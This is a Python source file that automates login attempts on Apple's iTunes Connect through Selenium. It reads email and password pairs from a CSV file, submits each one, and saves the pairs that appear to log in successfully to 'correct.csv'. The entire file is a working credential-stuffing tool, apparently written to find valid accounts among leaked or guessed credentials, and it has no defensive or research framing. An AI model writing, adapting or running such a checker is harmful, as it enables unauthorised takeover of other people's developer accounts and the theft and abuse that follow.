# -*- coding: utf-8 -*-
import csv
import logging
from time import sleep
from selenium import webdriver
from selenium.webdriver.common.keys import Keys


logging.basicConfig(level=logging.INFO)
TIMESLEEP = 2
TIMEWAIT = 10


def generate_mail_list(file):
    maillist = []
    with open(file) as csvfile:
        data = csv.reader(csvfile)
        for row in data:
            maillist.append({'mail': row[0], 'pass': row[1]})

    return tuple(maillist)


def check_mail_list(users):
    browser = webdriver.Firefox()
    browser.set_window_position(0, 0)
    browser.set_window_size(900, 600)
    browser.get('https://itunesconnect.apple.com')
    sleep(TIMEWAIT)
    browser.switch_to.frame(browser.find_element_by_id("authFrame"))

    for i in range(len(users)):
        try:
            print('Try {0}/{1}: '.format(i, len(users)), users[i].get('mail'))
            mail_form = browser.find_element_by_id('appleId')
            mail_form.send_keys(users[i].get('mail'))
            pass_form = browser.find_element_by_id('pwd')
            pass_form.send_keys(users[i].get('pass') + Keys.RETURN)
            sleep(TIMESLEEP)
            mail_form.clear()  # exception if auth = true
        except:
            print('Correct:', users[i])
            with open('correct.csv', 'a') as csvfile:
                fieldnames = ['mail', 'pass']
                writer = csv.DictWriter(csvfile, fieldnames=fieldnames)
                writer.writerow(users[i])

            browser.delete_all_cookies()
            sleep(TIMESLEEP)
            browser.get('https://itunesconnect.apple.com')
            sleep(TIMEWAIT)
            browser.switch_to.frame(browser.find_element_by_id("authFrame"))
            continue

    browser.close()


if __name__ == '__main__':
    check_mail_list(users=generate_mail_list(file='data.csv'))
